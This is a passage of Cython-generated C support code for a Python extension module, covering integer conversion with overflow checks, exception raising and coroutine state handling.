                                __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(long) - 1 > 4 * PyLong_SHIFT)) {
                                return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                            }
                        }
                        break;
                }
            }
#endif
            if ((sizeof(long) <= sizeof(long))) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if ((sizeof(long) <= sizeof(PY_LONG_LONG))) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
#if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
#endif
            if (likely(v)) {
                int ret = -1;
#if PY_VERSION_HEX < 0x030d0000 && !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                ret = _PyLong_AsByteArray((PyLongObject *)v,
                                           bytes, sizeof(val),
                                           is_little, !is_unsigned);
#else
                PyObject *stepval = NULL, *mask = NULL, *shift = NULL;
                int bits, remaining_bits, is_negative = 0;
                long idigit;
                int chunk_size = (sizeof(long) < 8) ? 30 : 62;
                if (unlikely(!PyLong_CheckExact(v))) {
                    PyObject *tmp = v;
                    v = PyNumber_Long(v);
                    assert(PyLong_CheckExact(v));
                    Py_DECREF(tmp);
                    if (unlikely(!v)) return (long) -1;
                }
#if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
                if (Py_SIZE(x) == 0)
                    return (long) 0;
                is_negative = Py_SIZE(x) < 0;
#else
                {
                    int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                    if (unlikely(result < 0))
                        return (long) -1;
                    is_negative = result == 1;
                }
#endif
                if (is_unsigned && unlikely(is_negative)) {
                    goto raise_neg_overflow;
                } else if (is_negative) {
                    stepval = PyNumber_Invert(v);
                    if (unlikely(!stepval))
                        return (long) -1;
                } else {
                    stepval = __Pyx_NewRef(v);
                }
                val = (long) 0;
                mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;
                shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;
                for (bits = 0; bits < (int) sizeof(long) * 8 - chunk_size; bits += chunk_size) {
                    PyObject *tmp, *digit;
                    digit = PyNumber_And(stepval, mask);
                    if (unlikely(!digit)) goto done;
                    idigit = PyLong_AsLong(digit);
                    Py_DECREF(digit);
                    if (unlikely(idigit < 0)) goto done;
                    tmp = PyNumber_Rshift(stepval, shift);
                    if (unlikely(!tmp)) goto done;
                    Py_DECREF(stepval); stepval = tmp;
                    val |= ((long) idigit) << bits;
                    #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
                    if (Py_SIZE(stepval) == 0)
                        goto unpacking_done;
                    #endif
                }
                idigit = PyLong_AsLong(stepval);
                if (unlikely(idigit < 0)) goto done;
                remaining_bits = ((int) sizeof(long) * 8) - bits - (is_unsigned ? 0 : 1);
                if (unlikely(idigit >= (1L << remaining_bits)))
                    goto raise_overflow;
                val |= ((long) idigit) << bits;
            #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
            unpacking_done:
            #endif
                if (!is_unsigned) {
                    if (unlikely(val & (((long) 1) << (sizeof(long) * 8 - 1))))
                        goto raise_overflow;
                    if (is_negative)
                        val = ~val;
                }
                ret = 0;
            done:
                Py_XDECREF(shift);
                Py_XDECREF(mask);
                Py_XDECREF(stepval);
#endif
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* FormatTypeName */
#if CYTHON_COMPILING_IN_LIMITED_API
static __Pyx_TypeName
__Pyx_PyType_GetName(PyTypeObject* tp)
{
    PyObject *name = __Pyx_PyObject_GetAttrStr((PyObject *)tp,
                                               __pyx_n_s_name_2);
    if (unlikely(name == NULL) || unlikely(!PyUnicode_Check(name))) {
        PyErr_Clear();
        Py_XDECREF(name);
        name = __Pyx_NewRef(__pyx_n_s__160);
    }
    return name;
}
#endif

/* CIntFromPy */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if ((sizeof(int) < sizeof(long))) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            if (unlikely(__Pyx_PyLong_IsNeg(x))) {
                goto raise_neg_overflow;
            } else if (__Pyx_PyLong_IsCompact(x)) {
                __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_upylong, __Pyx_PyLong_CompactValueUnsigned(x))
            } else {
                const digit* digits = __Pyx_PyLong_Digits(x);
                assert(__Pyx_PyLong_DigitCount(x) > 1);
                switch (__Pyx_PyLong_DigitCount(x)) {
                    case 2:
                        if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) >= 2 * PyLong_SHIFT)) {
                                return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                            }
                        }
                        break;
                    case 3:
                        if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) >= 3 * PyLong_SHIFT)) {
                                return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                            }
                        }
                        break;
                    case 4:
                        if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) >= 4 * PyLong_SHIFT)) {
                                return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                            }
                        }
                        break;
                }
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030C00A7
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if ((sizeof(int) <= sizeof(unsigned long))) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if ((sizeof(int) <= sizeof(unsigned PY_LONG_LONG))) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            if (__Pyx_PyLong_IsCompact(x)) {
                __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))
            } else {
                const digit* digits = __Pyx_PyLong_Digits(x);
                assert(__Pyx_PyLong_DigitCount(x) > 1);
                switch (__Pyx_PyLong_SignedDigitCount(x)) {
                    case -2:
                        if ((8 * sizeof(int) - 1 > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {
                                return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case 2:
                        if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {
                                return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case -3:
                        if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {
                                return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case 3:
                        if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {
                                return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case -4:
                        if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {
                                return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                    case 4:
                        if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {
                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {
                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                            } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {
                                return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                            }
                        }
                        break;
                }
            }
#endif
            if ((sizeof(int) <= sizeof(long))) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if ((sizeof(int) <= sizeof(PY_LONG_LONG))) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
#if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
#endif
            if (likely(v)) {
                int ret = -1;
#if PY_VERSION_HEX < 0x030d0000 && !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                ret = _PyLong_AsByteArray((PyLongObject *)v,
                                           bytes, sizeof(val),
                                           is_little, !is_unsigned);
#else
                PyObject *stepval = NULL, *mask = NULL, *shift = NULL;
                int bits, remaining_bits, is_negative = 0;
                long idigit;
                int chunk_size = (sizeof(long) < 8) ? 30 : 62;
                if (unlikely(!PyLong_CheckExact(v))) {
                    PyObject *tmp = v;
                    v = PyNumber_Long(v);
                    assert(PyLong_CheckExact(v));
                    Py_DECREF(tmp);
                    if (unlikely(!v)) return (int) -1;
                }
#if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
                if (Py_SIZE(x) == 0)
                    return (int) 0;
                is_negative = Py_SIZE(x) < 0;
#else
                {
                    int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                    if (unlikely(result < 0))
                        return (int) -1;
                    is_negative = result == 1;
                }
#endif
                if (is_unsigned && unlikely(is_negative)) {
                    goto raise_neg_overflow;
                } else if (is_negative) {
                    stepval = PyNumber_Invert(v);
                    if (unlikely(!stepval))
                        return (int) -1;
                } else {
                    stepval = __Pyx_NewRef(v);
                }
                val = (int) 0;
                mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;
                shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;
                for (bits = 0; bits < (int) sizeof(int) * 8 - chunk_size; bits += chunk_size) {
                    PyObject *tmp, *digit;
                    digit = PyNumber_And(stepval, mask);
                    if (unlikely(!digit)) goto done;
                    idigit = PyLong_AsLong(digit);
                    Py_DECREF(digit);
                    if (unlikely(idigit < 0)) goto done;
                    tmp = PyNumber_Rshift(stepval, shift);
                    if (unlikely(!tmp)) goto done;
                    Py_DECREF(stepval); stepval = tmp;
                    val |= ((int) idigit) << bits;
                    #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
                    if (Py_SIZE(stepval) == 0)
                        goto unpacking_done;
                    #endif
                }
                idigit = PyLong_AsLong(stepval);
                if (unlikely(idigit < 0)) goto done;
                remaining_bits = ((int) sizeof(int) * 8) - bits - (is_unsigned ? 0 : 1);
                if (unlikely(idigit >= (1L << remaining_bits)))
                    goto raise_overflow;
                val |= ((int) idigit) << bits;
            #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000
            unpacking_done:
            #endif
                if (!is_unsigned) {
                    if (unlikely(val & (((int) 1) << (sizeof(int) * 8 - 1))))
                        goto raise_overflow;
                    if (is_negative)
                        val = ~val;
                }
                ret = 0;
            done:
                Py_XDECREF(shift);
                Py_XDECREF(mask);
                Py_XDECREF(stepval);
#endif
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* RaiseException */
#if PY_MAJOR_VERSION < 3
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    __Pyx_PyThreadState_declare
    CYTHON_UNUSED_VAR(cause);
    Py_XINCREF(type);
    if (!value || value == Py_None)
        value = NULL;
    else
        Py_INCREF(value);
    if (!tb || tb == Py_None)
        tb = NULL;
    else {
        Py_INCREF(tb);
        if (!PyTraceBack_Check(tb)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: arg 3 must be a traceback or None");
            goto raise_error;
        }
    }
    if (PyType_Check(type)) {
#if CYTHON_COMPILING_IN_PYPY
        if (!value) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#endif
        PyErr_NormalizeException(&type, &value, &tb);
    } else {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto raise_error;
        }
        value = type;
        type = (PyObject*) Py_TYPE(type);
        Py_INCREF(type);
        if (!PyType_IsSubtype((PyTypeObject *)type, (PyTypeObject *)PyExc_BaseException)) {
            PyErr_SetString(PyExc_TypeError,
                "raise: exception class must be a subclass of BaseException");
            goto raise_error;
        }
    }
    __Pyx_PyThreadState_assign
    __Pyx_ErrRestore(type, value, tb);
    return;
raise_error:
    Py_XDECREF(value);
    Py_XDECREF(type);
    Py_XDECREF(tb);
    return;
}
#else
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause) {
    PyObject* owned_instance = NULL;
    if (tb == Py_None) {
        tb = 0;
    } else if (tb && !PyTraceBack_Check(tb)) {
        PyErr_SetString(PyExc_TypeError,
            "raise: arg 3 must be a traceback or None");
        goto bad;
    }
    if (value == Py_None)
        value = 0;
    if (PyExceptionInstance_Check(type)) {
        if (value) {
            PyErr_SetString(PyExc_TypeError,
                "instance exception may not have a separate value");
            goto bad;
        }
        value = type;
        type = (PyObject*) Py_TYPE(value);
    } else if (PyExceptionClass_Check(type)) {
        PyObject *instance_class = NULL;
        if (value && PyExceptionInstance_Check(value)) {
            instance_class = (PyObject*) Py_TYPE(value);
            if (instance_class != type) {
                int is_subclass = PyObject_IsSubclass(instance_class, type);
                if (!is_subclass) {
                    instance_class = NULL;
                } else if (unlikely(is_subclass == -1)) {
                    goto bad;
                } else {
                    type = instance_class;
                }
            }
        }
        if (!instance_class) {
            PyObject *args;
            if (!value)
                args = PyTuple_New(0);
            else if (PyTuple_Check(value)) {
                Py_INCREF(value);
                args = value;
            } else
                args = PyTuple_Pack(1, value);
            if (!args)
                goto bad;
            owned_instance = PyObject_Call(type, args, NULL);
            Py_DECREF(args);
            if (!owned_instance)
                goto bad;
            value = owned_instance;
            if (!PyExceptionInstance_Check(value)) {
                PyErr_Format(PyExc_TypeError,
                             "calling %R should have returned an instance of "
                             "BaseException, not %R",
                             type, Py_TYPE(value));
                goto bad;
            }
        }
    } else {
        PyErr_SetString(PyExc_TypeError,
            "raise: exception class must be a subclass of BaseException");
        goto bad;
    }
    if (cause) {
        PyObject *fixed_cause;
        if (cause == Py_None) {
            fixed_cause = NULL;
        } else if (PyExceptionClass_Check(cause)) {
            fixed_cause = PyObject_CallObject(cause, NULL);
            if (fixed_cause == NULL)
                goto bad;
        } else if (PyExceptionInstance_Check(cause)) {
            fixed_cause = cause;
            Py_INCREF(fixed_cause);
        } else {
            PyErr_SetString(PyExc_TypeError,
                            "exception causes must derive from "
                            "BaseException");
            goto bad;
        }
        PyException_SetCause(value, fixed_cause);
    }
    PyErr_SetObject(type, value);
    if (tb) {
      #if PY_VERSION_HEX >= 0x030C00A6
        PyException_SetTraceback(value, tb);
      #elif CYTHON_FAST_THREAD_STATE
        PyThreadState *tstate = __Pyx_PyThreadState_Current;
        PyObject* tmp_tb = tstate->curexc_traceback;
        if (tb != tmp_tb) {
            Py_INCREF(tb);
            tstate->curexc_traceback = tb;
            Py_XDECREF(tmp_tb);
        }
#else
        PyObject *tmp_type, *tmp_value, *tmp_tb;
        PyErr_Fetch(&tmp_type, &tmp_value, &tmp_tb);
        Py_INCREF(tb);
        PyErr_Restore(tmp_type, tmp_value, tb);
        Py_XDECREF(tmp_tb);
#endif
    }
bad:
    Py_XDECREF(owned_instance);
    return;
}
#endif

/* CoroutineBase */
#include <frameobject.h>
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
#define __Pyx_Coroutine_Undelegate(gen) Py_CLEAR((gen)->yieldfrom)
static int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *__pyx_tstate, PyObject **pvalue) {
    PyObject *et, *ev, *tb;
    PyObject *value = NULL;
    CYTHON_UNUSED_VAR(__pyx_tstate);
    __Pyx_ErrFetch(&et, &ev, &tb);
    if (!et) {
        Py_XDECREF(tb);
        Py_XDECREF(ev);
        Py_INCREF(Py_None);
        *pvalue = Py_None;
        return 0;
    }
    if (likely(et == PyExc_StopIteration)) {
        if (!ev) {
            Py_INCREF(Py_None);
            value = Py_None;
        }
#if PY_VERSION_HEX >= 0x030300A0
        else if (likely(__Pyx_IS_TYPE(ev, (PyTypeObject*)PyExc_StopIteration))) {
            value = ((PyStopIterationObject *)ev)->value;
            Py_INCREF(value);
            Py_DECREF(ev);
        }
#endif
        else if (unlikely(PyTuple_Check(ev))) {
            if (PyTuple_GET_SIZE(ev) >= 1) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                value = PyTuple_GET_ITEM(ev, 0);
                Py_INCREF(value);
#else
                value = PySequence_ITEM(ev, 0);
#endif
            } else {
                Py_INCREF(Py_None);
                value = Py_None;
            }
            Py_DECREF(ev);
        }
        else if (!__Pyx_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration)) {
            value = ev;
        }
        if (likely(value)) {
            Py_XDECREF(tb);
            Py_DECREF(et);
            *pvalue = value;
            return 0;
        }
    } else if (!__Pyx_PyErr_GivenExceptionMatches(et, PyExc_StopIteration)) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    PyErr_NormalizeException(&et, &ev, &tb);
    if (unlikely(!PyObject_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration))) {
        __Pyx_ErrRestore(et, ev, tb);
        return -1;
    }
    Py_XDECREF(tb);
    Py_DECREF(et);
#if PY_VERSION_HEX >= 0x030300A0
    value = ((PyStopIterationObject *)ev)->value;
    Py_INCREF(value);
    Py_DECREF(ev);
#else
    {
        PyObject* args = __Pyx_PyObject_GetAttrStr(ev, __pyx_n_s_args);
        Py_DECREF(ev);
        if (likely(args)) {
            value = PySequence_GetItem(args, 0);
            Py_DECREF(args);
        }
        if (unlikely(!value)) {
            __Pyx_ErrRestore(NULL, NULL, NULL);
            Py_INCREF(Py_None);
            value = Py_None;
        }
    }
#endif
    *pvalue = value;
    return 0;
}
static CYTHON_INLINE
void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *exc_state) {
#if PY_VERSION_HEX >= 0x030B00a4
    Py_CLEAR(exc_state->exc_value);
#else
    PyObject *t, *v, *tb;
    t = exc_state->exc_type;
    v = exc_state->exc_value;
    tb = exc_state->exc_traceback;
    exc_state->exc_type = NULL;
    exc_state->exc_value = NULL;
    exc_state->exc_traceback = NULL;
    Py_XDECREF(t);
    Py_XDECREF(v);
    Py_XDECREF(tb);
#endif
}
#define __Pyx_Coroutine_AlreadyRunningError(gen)  (__Pyx__Coroutine_AlreadyRunningError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyRunningError(__pyx_CoroutineObject *gen) {
    const char *msg;
    CYTHON_MAYBE_UNUSED_VAR(gen);
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check((PyObject*)gen)) {
        msg = "coroutine already executing";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact((PyObject*)gen)) {
        msg = "async generator already executing";
    #endif
    } else {
        msg = "generator already executing";
    }
    PyErr_SetString(PyExc_ValueError, msg);
}
#define __Pyx_Coroutine_NotStartedError(gen)  (__Pyx__Coroutine_NotStartedError(gen), (PyObject*)NULL)
static void __Pyx__Coroutine_NotStartedError(PyObject *gen) {
    const char *msg;
    CYTHON_MAYBE_UNUSED_VAR(gen);
    if ((0)) {
    #ifdef __Pyx_Coroutine_USED
    } else if (__Pyx_Coroutine_Check(gen)) {
        msg = "can't send non-None value to a just-started coroutine";
    #endif
    #ifdef __Pyx_AsyncGen_USED
    } else if (__Pyx_AsyncGen_CheckExact(gen)) {
        msg = "can't send non-None value to a just-started async generator";
    #endif
    } else {
        msg = "can't send non-None value to a just-started generator";
    }
    PyErr_SetString(PyExc_TypeError, msg);
}
#define __Pyx_Coroutine_AlreadyTerminatedError(gen, value, closing)  (__Pyx__Coroutine_AlreadyTerminatedError(gen, value, closing), (PyObject*)NULL)
static void __Pyx__Coroutine_AlreadyTerminatedError(PyObject *gen, PyObject *value, int closing) {
    CYTHON_MAYBE_UNUSED_VAR(gen);
    CYTHON_MAYBE_UNUSED_VAR(closing);
    #ifdef __Pyx_Coroutine_USED
    if (!closing && __Pyx_Coroutine_Check(gen)) {
        PyErr_SetString(PyExc_RuntimeError, "cannot reuse already awaited coroutine");
    } else
    #endif
    if (value) {
        #ifdef __Pyx_AsyncGen_USED
        if (__Pyx_AsyncGen_CheckExact(gen))
            PyErr_SetNone(__Pyx_PyExc_StopAsyncIteration);
        else
        #endif
        PyErr_SetNone(PyExc_StopIteration);
    }
}
static
PyObject *__Pyx_Coroutine_SendEx(__pyx_CoroutineObject *self, PyObject *value, int closing) {
    __Pyx_PyThreadState_declare
    PyThreadState *tstate;
    __Pyx_ExcInfoStruct *exc_state;
    PyObject *retval;
    assert(!self->is_running);
    if (unlikely(self->resume_label == 0)) {
        if (unlikely(value && value != Py_None)) {
            return __Pyx_Coroutine_NotStartedError((PyObject*)self);
        }
    }
    if (unlikely(self->resume_label == -1)) {
        return __Pyx_Coroutine_AlreadyTerminatedError((PyObject*)self, value, closing);
    }
#if CYTHON_FAST_THREAD_STATE
    __Pyx_PyThreadState_assign
    tstate = __pyx_tstate;
#else
    tstate = __Pyx_PyThreadState_Current;
#endif
    exc_state = &self->gi_exc_state;
    if (exc_state->exc_value) {
        #if CYTHON_COMPILING_IN_PYPY
        #else
        PyObject *exc_tb;
        #if PY_VERSION_HEX >= 0x030B00a4 && !CYTHON_COMPILING_IN_CPYTHON
        exc_tb = PyException_GetTraceback(exc_state->exc_value);
        #elif PY_VERSION_HEX >= 0x030B00a4
        exc_tb = ((PyBaseExceptionObject*) exc_state->exc_value)->traceback;
        #else
        exc_tb = exc_state->exc_traceback;
        #endif
        if (exc_tb) {
            PyTracebackObject *tb = (PyTracebackObject *) exc_tb;
            PyFrameObject *f = tb->tb_frame;
            assert(f->f_back == NULL);
            #if PY_VERSION_HEX >= 0x030B00A1
            f->f_back = PyThreadState_GetFrame(tstate);
            #else
            Py_XINCREF(tstate->frame);
            f->f_back = tstate->frame;
            #endif
            #if PY_VERSION_HEX >= 0x030B00a4 && !CYTHON_COMPILING_IN_CPYTHON
            Py_DECREF(exc_tb);
            #endif
        }
        #endif
    }
#if CYTHON_USE_EXC_INFO_STACK
    exc_state->previous_item = tstate->exc_info;
    tstate->exc_info = exc_state;
#else
    if (exc_state->exc_type) {
        __Pyx_ExceptionSwap(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    } else {
        __Pyx_Coroutine_ExceptionClear(exc_state);
        __Pyx_ExceptionSave(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);
    }
#endif
    self->is_running = 1;
    retval = self->body(self, tstate, value);
    self->is_running = 0;
#if CYTHON_USE_EXC_INFO_STACK
    exc_state = &self->gi_exc_state;
    tstate->exc_info = exc_state->previous_item;
    exc_state->previous_item = NULL;
    __Pyx_Coroutine_ResetFrameBackpointer(exc_state);
#endif
    return retval;
}
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state) {
#if CYTHON_COMPILING_IN_PYPY
    CYTHON_UNUSED_VAR(exc_state);
#else
    PyObject *exc_tb;
    #if PY_VERSION_HEX >= 0x030B00a4
    if (!exc_state->exc_value) return;
    exc_tb = PyException_GetTraceback(exc_state->exc_value);
    #else
    exc_tb = exc_state->exc_traceback;
    #endif
    if (likely(exc_tb)) {
        PyTracebackObject *tb = (PyTracebackObject *) exc_tb;
        PyFrameObject *f = tb->tb_frame;
        Py_CLEAR(f->f_back);
        #if PY_VERSION_HEX >= 0x030B00a4
        Py_DECREF(exc_tb);
        #endif
    }
#endif
}
static CYTHON_INLINE
PyObject *__Pyx_Coroutine_MethodReturn(PyObject* gen, PyObject *retval) {
